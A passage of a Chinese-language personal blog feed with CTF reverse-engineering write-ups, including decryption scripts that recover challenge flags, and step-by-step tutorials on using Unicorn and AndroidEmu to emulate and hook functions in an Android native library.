SBOX = [0x28, 0x90, 0xC3, 0x41, 0xC2, 0x75, 0x84, 0xDA, 0x79, 0xE7, 0x21, 0x0C, 0x81, 0xD5, 0xBF, 0x92, 0xB8, 0x4E, 0xB1, 0x2D, 0xED, 0x5C, 0xCB, 0x99, 0x6A, 0x32, 0x6F, 0xF2, 0x52, 0x4D, 0x29, 0x77, 0x49, 0x1D, 0xBB, 0x3A, 0x9F, 0x02, 0x1A, 0x71, 0x58, 0x72, 0xBA, 0xA1, 0x5E, 0xFA, 0x48, 0xF9, 0xFC, 0xF7, 0xA6, 0x97, 0x9D, 0x24, 0x0D, 0xE0, 0xF3, 0x37, 0x08, 0xEA, 0xF5, 0x6B, 0x86, 0xEF, 0x8D, 0x61, 0x65, 0x17, 0xD7, 0x7E, 0x13, 0x9C, 0xCC, 0x12, 0x33, 0x8E, 0x7D, 0x2F, 0x55, 0xCA, 0xAB, 0xE4, 0xFE, 0x45, 0xD6, 0xF6, 0xDE, 0xF1, 0x67, 0xE1, 0x0B, 0xB2, 0xAE, 0xCF, 0x7C, 0x04, 0x0E, 0x16, 0xA2, 0x00, 0xC6, 0xFF, 0x2C, 0x1E, 0x47, 0x30, 0xA4, 0x40, 0x4B, 0x15, 0x38, 0x35, 0xAF, 0x3E, 0x39, 0x3C, 0xD2, 0x85, 0xC7, 0x64, 0x89, 0xFD, 0xE8, 0x8B, 0x43, 0xC8, 0x22, 0x94, 0xA8, 0x31, 0xA3, 0xB9, 0x20, 0xEB, 0xB0, 0x01, 0x3D, 0x68, 0x5A, 0x93, 0x5B, 0x4F, 0x50, 0xE6, 0x6D, 0xF4, 0x44, 0x10, 0x80, 0xA7, 0x51, 0xD3, 0xC4, 0x2B, 0x88, 0x95, 0xA5, 0x70, 0x23, 0x18, 0x09, 0x4A, 0x19, 0x66, 0xDC, 0xEC, 0x14, 0xA9, 0xDB, 0xE2, 0x91, 0x4C, 0x57, 0x82, 0x1B, 0x2A, 0x11, 0x7B, 0x5D, 0x8A, 0xD4, 0xA0, 0x07, 0xD8, 0x53, 0x9B, 0x26, 0xD1, 0x98, 0x42, 0x0A, 0x9A, 0x1C, 0x8F, 0x5F, 0x63, 0xE9, 0xCD, 0xC1, 0x1F, 0x6C, 0xCE, 0xAC, 0xAA, 0xD0, 0x7F, 0x59, 0xBE, 0xB6, 0x46, 0xB7, 0x83, 0xEE, 0x7A, 0x9E, 0xC5, 0x62, 0x60, 0xF0, 0x8C, 0x2E, 0xC0, 0xDD, 0x73, 0x56, 0x76, 0x27, 0xB5, 0x25, 0x74, 0x6E, 0xC9, 0xDF, 0xB4, 0x34, 0x05, 0xD9, 0xB3, 0xBD, 0x3B, 0x54, 0xAD, 0x0F, 0x87, 0x78, 0xFB, 0x69, 0xF8, 0xBC, 0xE3, 0x96, 0x03, 0x3F, 0xE5, 0x06, 0x36]
key = [bytearray(b&quot;vMBixpswDVgJhpZd&quot;),[a1[i] for i in range(16)],[a1[i] for i in range(16,32)]]
for i in range(3):
    for p in range(21,-1,-1):
        row_re(i)
        for j in range(i*16,(i+1)*16):
            a1[j] = SBOX.index(a1[j])
        for k in range(16):
            a1[i*16+k] ^= key_t[p*16 + k]
    for l in range(16):
            a1[l+16*i] ^= key[i][l]
bytearray(a1)
# SYC&#123;ZtZJpWvEthTkaDzLQznEYLybEcNOPfmlukmZbzXBhih&#125;
</code></pre>
<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>unicorn_learning3</title>
    <url>/2022/12/31/unicorn-learning3/</url>
    <content><![CDATA[<p>unicorn start</p>
<p>模拟器框架自动填充got表项内容</p>
<span id="more"></span>

<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>hook JNI函数</p>
<p><img src="/./../images/image-20221231092735710.png" alt="image-20221231092735710"></p>
<p>hook JNI函数的条件：</p>
<p><img src="/./../images/1.png" alt="1"></p>
<p>框架：<img src="/./../images/image-20221231093245212.png" alt="image-20221231093245212"></p>
<h3 id="打印调试信息"><a href="#打印调试信息" class="headerlink" title="打印调试信息"></a>打印调试信息</h3><pre><code class="py">import logging
import sys

# 配置logging
logging.basicConfig(
    stream=sys.stdout,
    level=logging.debug,
    format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;
                    )
# 用于打印调试信息
logger = logging.getLogger(__name__)
</code></pre>
<h3 id="创建模拟器-导入so文件-执行"><a href="#创建模拟器-导入so文件-执行" class="headerlink" title="创建模拟器+导入so文件+执行"></a>创建模拟器+导入so文件+执行</h3><p>用写好的框架进行模拟执行，不需要考虑手动填充got表项</p>
<pre><code class="py"># 创建模拟器
emulator = Emulator()

# 加载相关so文件
# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，
# 这可能会涉及更多库的调用
emulator.load_library(&#39;./lib/libc.so&#39;,do_init=False)
libnat_mod = emulator.load_library(&#39;./lib/libnative-lib.so&#39;,do_init=False)

# 开始执行想要执行的jni函数
try:
    # 根据so模块调用指定的函数，后面都是函数的参数
    # 参数1: JNIEnv
    # 参数2: 是java类的对象，这里填0即可
    # 参数3: 是函数输入字符串
    sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv2&#39;,
                         emulator.java_vm.jni_env.address_ptr,0,&#39;123&#39;)
    print(sign)
except UcError as e:
    print(e)
</code></pre>
<p>这里出现libc的基地址</p>
<p><img src="/./../images/image-20221231100141520.png" alt="image-20221231100141520"></p>
<p>这里出现libnative-lib.so的基地址。3）处有报错，但又不知道哪里有错</p>
<p><img src="/./../images/image-20221231100259956.png" alt="image-20221231100259956"></p>
<h3 id="跟踪报错信息"><a href="#跟踪报错信息" class="headerlink" title="跟踪报错信息"></a>跟踪报错信息</h3><p>打印异常地址和地址调用栈,这里打印最后100条即可,用udbg打印</p>
<pre><code class="py"># 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址
dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)


# 开始执行想要执行的jni函数
try:
    # 根据so模块调用指定的函数，后面都是函数的参数
    # 参数1: JNIEnv
    # 参数2: 是java类的对象，这里填0即可
    # 参数3: 是函数输入字符串
    sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv2&#39;,
                         emulator.java_vm.jni_env.address_ptr,0,&#39;123&#39;)
    print(sign)
except UcError as e:
    # 打印调用栈
    tracks = dbg.get_tracks()
    # 这里打印调用地址即可，打印后100条
    for addr in tracks[-100:-1]:
        print(hex(addr - 0xcbc66000)) # 注意这里要减去基地址
    print(e)
</code></pre>
<p>这里有函数参数提示：</p>
<p><img src="/./../images/image-20221231100710715.png" alt="image-20221231100710715"></p>
<p>这里有出现负地址，负地址就是函数执行到libc.so文件中，这里由于没有初始化的缘故，可能libc中部分函数执行失败，这里我们手动hook，&#x3D;&#x3D;本质是hook got表地址&#x3D;&#x3D;</p>
<p><img src="/./../images/image-20221231101354303.png" alt="image-20221231101354303"></p>
<p>这里我们定位到ida中出错的地址</p>
<p><img src="/./../images/image-20221231101510570.png" alt="image-20221231101510570"></p>
<p>发现是这个库函数有问题。那就hook它</p>
<p><img src="/./../images/image-20221231102149719.png" alt="image-20221231102149719"></p>
<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><p>添加hook 此处必须在导入so文件之前就hook，在导入so文件之前hook才生效，导入之后没法hook</p>
<pre><code class="py"># 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器
@native_method
def __aeabi_memclr(mu,addr,size):
    print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size))
    
# 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容
# 在导入so文件之前hook才生效，导入之后没法hook
emulator.modules.add_symbol_hook(&#39;__aeabi_memclr&#39;, emulator.hooker.write_function(__aeabi_memclr) + 1)
</code></pre>
<p>其他函数以此类推</p>
<p>关于sprintf函数，第一个参数，是a2，就是buffer地址</p>
<p><img src="/./../images/image-20221231103838068.png" alt="image-20221231103838068"></p>
<p>全部函数hook后：</p>
<p><img src="/./../images/image-20221231104133180.png" alt="image-20221231104133180"></p>
<p>这里输出是空因为，我们hook相关函数还未在unicorn中实现，这里我们做个实现即可</p>
<pre><code class="py">@native_method
def __aeabi_memclr(mu,addr,size):
    mu.mem_write(addr,bytes(size))
    print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size))

@native_method
def __aeabi_memcpy(mu,dist,source,size):
    data = mu.mem_read(source,size)
    mu.mem_write(dist,bytes(data))
    print(&#39;__aeabi_memcpy (dist:%x,source:%x)&#39; % (dist,source))

@native_method
def sprintf(mu,buffer,format,arg1,arg2):
    format1 = memory_helpers.read_utf8(mu,format)
    data1 = memory_helpers.read_utf8(mu,arg1)
    res = format1 % (data1,arg2)
    mu.mem_write(buffer,bytes((res+&#39;\x00&#39;).encode(&#39;utf-8&#39;)))
    print(&#39;sprintf (%s)&#39; % (format))
</code></pre>
<p>这里说明一下bytes()函数放入int型会输出什么：</p>
<p><img src="/./../images/image-20221231104346170.png" alt="image-20221231104346170"></p>
<p>最终结果：</p>
<p><img src="/./../images/image-20221231105346413.png" alt="image-20221231105346413"></p>
<p>全部代码：</p>
<pre><code class="py">from unicorn import *
import logging
import sys
from androidemu.java.helpers.native_method import native_method
from UnicornTraceDebugger import udbg
from androidemu.emulator import Emulator
from androidemu.utils import memory_helpers

# 配置logging
logging.basicConfig(
    stream=sys.stdout,
    level=logging.DEBUG,
    format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;
                    )
# 用于打印调试信息
logger = logging.getLogger(__name__)

# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器
@native_method
def __aeabi_memclr(mu,addr,size):
    mu.mem_write(addr,bytes(size))
    print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size))

@native_method
def __aeabi_memcpy(mu,dist,source,size):
    data = mu.mem_read(source,size)
    mu.mem_write(dist,bytes(data))
    print(&#39;__aeabi_memcpy (dist:%x,source:%x)&#39; % (dist,source))

@native_method
def sprintf(mu,buffer,format,arg1,arg2):
    format1 = memory_helpers.read_utf8(mu,format)
    data1 = memory_helpers.read_utf8(mu,arg1)
    res = format1 % (data1,arg2)
    mu.mem_write(buffer,bytes((res+&#39;\x00&#39;).encode(&#39;utf-8&#39;)))
    print(&#39;sprintf (%s)&#39; % (format))
# 创建模拟器
emulator = Emulator()

# 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容
# 在导入so文件之前hook才生效，导入之后没法hook
emulator.modules.add_symbol_hook(&#39;__aeabi_memclr&#39;, emulator.hooker.write_function(__aeabi_memclr) + 1)
emulator.modules.add_symbol_hook(&#39;__aeabi_memcpy&#39;, emulator.hooker.write_function(__aeabi_memcpy) + 1)
emulator.modules.add_symbol_hook(&#39;sprintf&#39;, emulator.hooker.write_function(sprintf) + 1)


# 加载相关so文件
# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，
# 这可能会涉及更多库的调用
emulator.load_library(&#39;./lib/libc.so&#39;,do_init=False)
libnat_mod = emulator.load_library(&#39;./lib/libnative-lib.so&#39;,do_init=False)


# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址
dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)


# 开始执行想要执行的jni函数
try:
    # 根据so模块调用指定的函数，后面都是函数的参数
    # 参数1: JNIEnv
    # 参数2: 是java类的对象，这里填0即可
    # 参数3: 是函数输入字符串
    sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv2&#39;,
                         emulator.java_vm.jni_env.address_ptr,0,&#39;123&#39;)
    print(sign)
except UcError as e:
    # 打印调用栈
    tracks = dbg.get_tracks()
    # 这里打印调用地址即可，打印后100条
    for addr in tracks[-100:-1]:
        print(hex(addr - 0xcbc66000))
    print(e)


</code></pre>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>unicorn</tag>
      </tags>
  </entry>
  <entry>
    <title>unicorn_learning2</title>
    <url>/2022/12/30/unicorn-learning2/</url>
    <content><![CDATA[<p>unicorn start</p>
<p>用unicorn调用so文件中的某个函数，观察函数的输入与输出</p>
<span id="more"></span>

<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>hook  so文件中的sign1函数的输出与输入</p>
<p><img src="/./../images/image-20221230100636171.png" alt="image-20221230100636171"></p>
<p>这个函数内部调用了两个函数，tea_encrypt和sprintf，这两个函数中tea_encrypt函数只需要修复got表项即可调用tea_encrypt，但是sprintf函数不行</p>
<p>这里我们开始实验</p>
<h3 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h3><p>由于这里的指令都是两个字节为一条指令</p>
<p><img src="/./../images/image-20221230145634256.png" alt="image-20221230145634256"></p>
<p>所以这里为thumb指令集</p>
<pre><code class="py">def test_arm():
    print(&quot;Emulate ARM code&quot;)
    try:
        # Initialize emulator in ARM mode
        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)	# 创建代码
        # 其它代码添加到此处
        return mu
    except UcError as e:
        print(&quot;ERROR: %s&quot; % e)

mu = test_arm() # mu就是arm虚拟机
</code></pre>
<h3 id="建立内存映射-写入数据"><a href="#建立内存映射-写入数据" class="headerlink" title="建立内存映射+写入数据"></a>建立内存映射+写入数据</h3><p>由于这是要模拟执行一段函数，所以要建立镜像区，栈区，数据段区的内存</p>
<p>这里各个区的大小存粹靠估算</p>
<pre><code class="py">image = open(&#39;./libnative-lib.so&#39;,&#39;rb&#39;).read()
# 镜像内存
image_base = 0x0
mu.mem_map(image_base, 0x10000*8)  # 这里大小自己估算
mu.mem_write(image_base,image)

# 栈内存
stack_base = 0xa0000
stack_size = 0x10000 * 3
mu.mem_map(stack_base, stack_size)  # 这里大小自己估算
stack_top = stack_base + stack_size - 0x4
mu.reg_write(UC_ARM_REG_SP,stack_top)

# 数据段内存
a1 = b&#39;123&#39;
data_base = 0xf0000
data_size = 0x10000 * 3
mu.mem_map(data_base, data_size)  # 这里大小自己估算
mu.mem_write(data_base,a1)
</code></pre>
<p>这里栈区的sp指针应小于栈大小的0x4，防止栈溢出，这里我们将‘123’字符串写入数据段，来作为函数的参数使用</p>
<h3 id="添加hook函数"><a href="#添加hook函数" class="headerlink" title="添加hook函数"></a>添加hook函数</h3><p>主要用于程序报错时可以及时追踪到哪里有问题</p>
<pre><code class="py">def hook_code(uc, address, size, user_data):
    print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))

def hook_memory(uc, access, address, size,value, userdata):
    pc = uc.reg_read(UC_ARM_REG_PC)
    print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size))
    
mu.hook_add(UC_HOOK_CODE,hook_code,0)
mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0)
</code></pre>
<h3 id="开始执行"><a href="#开始执行" class="headerlink" title="开始执行"></a>开始执行</h3><pre><code class="py">#开始执行虚拟机
start_addr = 0x9B68
end_addr = 0x9C2C
try:
    mu.emu_start(start_addr, end_addr)
    R2 = mu.reg_read(UC_ARM_REG_R2)
    res = mu.mem_read(R2,16)
    print(binascii.b2a_hex(res))
except UcError as e:
    print(e)
</code></pre>
<p>结果只运行到第一条指令：</p>
<p><img src="/./../images/image-20221230141126071.png" alt="image-20221230141126071"></p>
<p><img src="/./../images/image-20221230141137038.png" alt="image-20221230141137038"></p>
<p>这里将开始地址+1，然后执行：</p>
<p><img src="/./../images/image-20221230141419595.png" alt="image-20221230141419595"></p>
<p><img src="/./../images/image-20221230141523486.png" alt="image-20221230141523486"></p>
<p>然后这里就遇到了函数地址外的地址，很奇怪！！！，这里找到0x91ac,也就是最后一次正常的地方，发现来到了plt表，点击后又来到got表，这里的got表其实是ida已经自动补全了，unicorn需要自己手动补全</p>
<p><img src="/./../images/image-20221230141839711.png" alt="image-20221230141839711"></p>
<p><img src="/./../images/image-20221230142108868.png" alt="image-20221230142108868"></p>
<p>补全后：</p>
<p><img src="/./../images/image-20221230152353412.png" alt="image-20221230152353412"></p>
<p>执行代码：</p>
<pre><code class="py">#开始执行虚拟机
start_addr = 0x9B68
end_addr = 0x9C2C
try:
    # 添加got表
    mu.mem_write(0x1EDB0,b&#39;\xD9\x98\x00\x00&#39;)
    mu.emu_start(start_addr+1, end_addr)
    R2 = mu.reg_read(UC_ARM_REG_R2)
    res = mu.mem_read(R2,16)
    print(binascii.b2a_hex(res))
except UcError as e:
    print(e)
</code></pre>
<hr>
<h3 id="最后代码："><a href="#最后代码：" class="headerlink" title="最后代码："></a>最后代码：</h3><pre><code class="py">from unicorn import *
from unicorn.arm_const  import *
import binascii
def hook_code(uc, address, size, user_data):
    print(&quot;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&quot; %(address, size))

def hook_memory(uc, access, address, size,value, userdata):
    pc = uc.reg_read(UC_ARM_REG_PC)
    print (&quot;memory error: pc:%x address:%x size:%x&quot; % (pc, address, size))
    
def test_arm():
    print(&quot;Emulate ARM code&quot;)
    try:
        # Initialize emulator in ARM mode
        mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)	# 创建代码
        # 其它代码添加到此处
        return mu
    except UcError as e:
        print(&quot;ERROR: %s&quot; % e)

mu = test_arm() # mu就是arm虚拟机
image = open(&#39;./libnative-lib.so&#39;,&#39;rb&#39;).read()
# 镜像内存
image_base = 0x0
mu.mem_map(image_base, 0x10000*8)  # 这里大小自己估算
mu.mem_write(image_base,image)

# 栈内存
stack_base = 0xa0000
stack_size = 0x10000 * 3
mu.mem_map(stack_base, stack_size)  # 这里大小自己估算
stack_top = stack_base + stack_size - 0x4
mu.reg_write(UC_ARM_REG_SP,stack_top)



# 数据段内存
a1 = b&#39;123&#39;
data_base = 0xf0000
data_size = 0x10000 * 3
mu.mem_map(data_base, data_size)  # 这里大小自己估算
mu.mem_write(data_base,a1)

#函数参数通过数据段传递 寄存器是R0
mu.reg_write(UC_ARM_REG_R0,data_base)

# 添加hook函数
# mu.hook_add(UC_HOOK_CODE,hook_code,0)
# mu.hook_add(UC_HOOK_MEM_UNMAPPED,hook_memory,0)

#开始执行虚拟机
start_addr = 0x9B68
end_addr = 0x9C2C
try:
    # 添加got表
    mu.mem_write(0x1EDB0,b&#39;\xD9\x98\x00\x00&#39;)
    mu.emu_start(start_addr+1, end_addr)
    R2 = mu.reg_read(UC_ARM_REG_R2)
    res = mu.mem_read(R2,16)
    print(binascii.b2a_hex(res))
except UcError as e:
    print(e)
</code></pre>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>unicorn</tag>
      </tags>
  </entry>
  <entry>
    <title>syc_level7</title>
    <url>/2022/12/20/syc-level7/</url>
    <content><![CDATA[<p>syc_level7</p>
<p>这种异常处理的catch代码一开始不会找，后来看了三叶草的战队的解答才知道怎么操作</p>
<span id="more"></span>

<p>这里有四个throw块，要找到对应catch代码，然后jmp过去就能看见源码，三叶草那边的解答是手撸汇编代码，说实话这种分析太慢，而且容易出错，还不如让ida来帮我们分析</p>
<p><img src="/./../images/image-20221220115828084.png" alt="image-20221220115828084"></p>
<p>转到卡片形式汇编代码，有这种标志的就是catch代码</p>
<p><img src="/./../images/image-20221220115956022.png" alt="image-20221220115956022"></p>
<p>然后将所有的catch块打上断点</p>
<p><img src="/./../images/image-20221220120047338.png" alt="image-20221220120047338"></p>
<p>然后在throw代码之前也都打上断点</p>
<p><img src="/./../images/image-20221220120159946.png" alt="image-20221220120159946"></p>
<p>然后，运行程序找到，各个throw对应的catch块</p>
<p>修改throw代码为jmp 对应catch地址，直接看到源码</p>
<p><img src="/./../images/image-20221220113600556.png" alt="image-20221220113600556"></p>
<p>这里随机数，大循环32次每一次要重置srand，小循环四次，所以只需要输出4个随机数即可</p>
<p>这里用c语言中的srand代码生成随机数，值得注意的是，&#x3D;&#x3D;我在windows上用c语言跑，跑出来的随机数根本不对。要在linux上面跑才行&#x3D;&#x3D;</p>
<p><img src="/./../images/image-20221220114740283.png" alt="image-20221220114740283"></p>
<p><img src="/./../images/image-20221220114707904.png" alt="image-20221220114707904"></p>
<p>这里根据随机数，标上代码块的执行顺序</p>
<p><img src="/./../images/image-20221220114941422.png" alt="image-20221220114941422"></p>
<p>最后python伪代码：</p>
<pre><code class="python">enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]
delta = 0x9E3779B9
for i in range(32):
    v11 += delta
    v12 += delta
    v7 += ((v8 &gt;&gt; 5) + 6) ^ (v8 + v11) ^ (16 * v8 + 8) ^ (i + v11)
    v9 += ((v10 &gt;&gt; 5) + 6) ^ (v10 + v12) ^ (16 * v10 + 8) ^ (i + v12)
    v8 += ((v7 &gt;&gt; 5) + 7) ^ (v7 + v11) ^ (16 * v7 + 9) ^ (i + v11)
    v10 += ((v9 &gt;&gt; 5) + 7) ^ (v9 + v12) ^ (16 * v9 + 9) ^ (i + v12)
v19 = v7 ^ HIBYTE(delta)
v20 = v8 ^ BYTE2(delta)
v21 = v9 ^ BYTE1(delta)
v22 = v10 ^ (unsigned __int8)delta
</code></pre>
<p>然后根据这个代码写出解密脚本：</p>
<pre><code class="python"># lesson7
from Crypto.Util.number import *
enc = [0xA3A7C060, 0xEE6E5485, 0x244B2655, 0x318482D9]
delta = 0x9E3779B9
s = (delta*32)&amp;0xffffffff
v7 = enc[0]^0x9e
v8 = enc[1]^0x37
v9 = enc[2]^0x79
v10 = enc[3]^0xb9
for i in range(31,-1,-1):
    v10 -= ((v9 &gt;&gt; 5) + 7) ^ (v9 + s) ^ (16 * v9 + 9) ^ (i + s)
    v10 = v10&amp;0xffffffff
    v8 -= ((v7 &gt;&gt; 5) + 7) ^ (v7 + s) ^ (16 * v7 + 9) ^ (i + s)
    v8 = v8&amp;0xffffffff
    v9 -= ((v10 &gt;&gt; 5) + 6) ^ (v10 + s) ^ (16 * v10 + 8) ^ (i + s)
    v9 = v9&amp;0xffffffff
    v7 -= ((v8 &gt;&gt; 5) + 6) ^ (v8 + s) ^ (16 * v8 + 8) ^ (i + s)
    v7 = v7&amp;0xffffffff
    s = (s-delta)&amp;0xffffffff
enc = [v7,v8,v9,v10]
flag = int(&#39;&#39;.join(map(lambda x: hex(x)[2:],enc)),16)
long_to_bytes(flag)
#SYC&#123;ediGegTEaEi&#125;
</code></pre>
]]></content>
      <categories>
        <category>ctf</category>
        <category>赛题复现wp</category>
      </categories>
  </entry>
  <entry>
    <title>unicorn_learning4</title>
    <url>/2022/12/31/unicorn-learning4/</url>
    <content><![CDATA[<p>unicorn_starting</p>
<p>模拟Jni与Java交互</p>
<span id="more"></span>

<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>hook这个函数，其中存在调用java类和java函数</p>
<p><img src="/./../images/image-20221231150501748.png" alt="image-20221231150501748"></p>
<p>尝试将上一次的代码进行修改后直接执行，观察结果</p>
<p><img src="/./../images/image-20221231153507375.png" alt="image-20221231153507375"></p>
<h3 id="注册java类和方法"><a href="#注册java类和方法" class="headerlink" title="注册java类和方法"></a>注册java类和方法</h3><p>结果发现不能找到java这个类，下面已经给出申明，直接复制即可</p>
<pre><code class="py">class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;):
    def __init__(self):
        pass
# 添加自定义java类
emulator.java_classloader.add_class(com_sec_udemo_MainActivity)
</code></pre>
<p>执行后发现又要声明相关方法:</p>
<p><img src="/./../images/image-20221231154406776.png" alt="image-20221231154406776"></p>
<p>声明方法：</p>
<pre><code class="py">@java_method_def(name=&#39;getSaltFromJava&#39;,signature=&#39;(Ljava/lang/String;)Ljava/lang/String;&#39;,
                     args_list=[&#39;jstring&#39;],native=False) # 这里native=False申明此方法非native方法
def getSaltFromJava(self,mu,data):
        pass
</code></pre>
<p>这个函数在java中的功能如下：</p>
<p><img src="/./../images/image-20221231142325743.png" alt="image-20221231142325743"></p>
<p>这里我们作出拼接返回即可</p>
<p>执行后再次报错</p>
<p><img src="/./../images/image-20221231155418523.png" alt="image-20221231155418523"></p>
<p>这里我们缺少jobject对象，这里我们手动创建一下，然后传入进去</p>
<pre><code class="py">obj = com_sec_udemo_MainActivity()
sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv3&#39;,
        emulator.java_vm.jni_env.address_ptr,obj,&#39;123&#39;)
print(sign)
</code></pre>
<p>然后这里又有相加时出现错误</p>
<p><img src="/./../images/image-20221231160243373.png" alt="image-20221231160243373"></p>
<p>这里我们调试一下，data的内容：</p>
<p><img src="/./../images/image-20221231160423365.png" alt="image-20221231160423365"></p>
<p>一看是java string类型，类型展开发现value中value就是python的str类型</p>
<p><img src="/./../images/image-20221231160549317.png" alt="image-20221231160549317"></p>
<p>修改后成功出结果：</p>
<p><img src="/./../images/image-20221231160712892.png" alt="image-20221231160712892"></p>
<p>完整代码：</p>
<pre><code class="py">from unicorn import *
import logging
import sys
from androidemu.java.helpers.native_method import native_method
from UnicornTraceDebugger import udbg
from androidemu.emulator import Emulator
from androidemu.utils import memory_helpers
from androidemu.java.java_classloader import JavaClassDef
from androidemu.java.java_method_def import java_method_def

# 配置logging
logging.basicConfig(
    stream=sys.stdout,
    level=logging.DEBUG,
    format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;
                    )
# 用于打印调试信息
logger = logging.getLogger(__name__)

class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;):
    def __init__(self):
        pass
    @java_method_def(name=&#39;getSaltFromJava&#39;,signature=&#39;(Ljava/lang/String;)Ljava/lang/String;&#39;,
                     args_list=[&#39;jstring&#39;],native=False)
    def getSaltFromJava(self,mu,data):
        print(&#39;hello&#39;)
        return data.value.value + &#39;salt..&#39;

# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器
@native_method
def __aeabi_memclr(mu,addr,size):
    mu.mem_write(addr,bytes(size))
    print(&#39;__aeabi_memclr_ptr (addr:%x,size:%d)&#39; % (addr,size))

@native_method
def __aeabi_memcpy(mu,dist,source,size):
    data = mu.mem_read(source,size)
    mu.mem_write(dist,bytes(data))
    print(&#39;__aeabi_memcpy (dist:%x,source:%x)&#39; % (dist,source))

@native_method
def sprintf(mu,buffer,format,arg1,arg2):
    format1 = memory_helpers.read_utf8(mu,format)
    data1 = memory_helpers.read_utf8(mu,arg1)
    res = format1 % (data1,arg2)
    mu.mem_write(buffer,bytes((res+&#39;\x00&#39;).encode(&#39;utf-8&#39;)))
    print(&#39;sprintf (%s)&#39; % (format))

# 创建模拟器
emulator = Emulator()

# 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容
# 在导入so文件之前hook才生效，导入之后没法hook
emulator.modules.add_symbol_hook(&#39;__aeabi_memclr&#39;, emulator.hooker.write_function(__aeabi_memclr) + 1)
emulator.modules.add_symbol_hook(&#39;__aeabi_memcpy&#39;, emulator.hooker.write_function(__aeabi_memcpy) + 1)
emulator.modules.add_symbol_hook(&#39;sprintf&#39;, emulator.hooker.write_function(sprintf) + 1)

# 添加自定义java类
emulator.java_classloader.add_class(com_sec_udemo_MainActivity)

# 加载相关so文件
# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，
# 这可能会涉及更多库的调用
emulator.load_library(&#39;./lib/libc.so&#39;,do_init=False)
libnat_mod = emulator.load_library(&#39;./lib/libnative-lib.so&#39;,do_init=False)

# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址
dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)


# 开始执行想要执行的jni函数
try:
    # 根据so模块调用指定的函数，后面都是函数的参数
    # 参数1: JNIEnv
    # 参数2: 是java类的对象，这里填0即可
    # 参数3: 是函数输入字符串
    obj = com_sec_udemo_MainActivity()
    sign = emulator.call_symbol(libnat_mod,&#39;Java_com_sec_udemo_MainActivity_sign_1lv3&#39;,
                         emulator.java_vm.jni_env.address_ptr,obj,&#39;123&#39;)
    print(sign)
except UcError as e:
    # 打印调用栈
    tracks = dbg.get_tracks()
    # 这里打印调用地址即可，打印后100条
    for addr in tracks[-100:-1]:
        print(hex(addr - 0xcbc66000))
    print(e)


</code></pre>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>unicorn</tag>
      </tags>
  </entry>
  <entry>
    <title>x86暴力调用so</title>
    <url>/2023/01/02/unicorn-x86%E6%9A%B4%E5%8A%9B%E8%B0%83%E7%94%A8/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="仅限作者学习使用" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
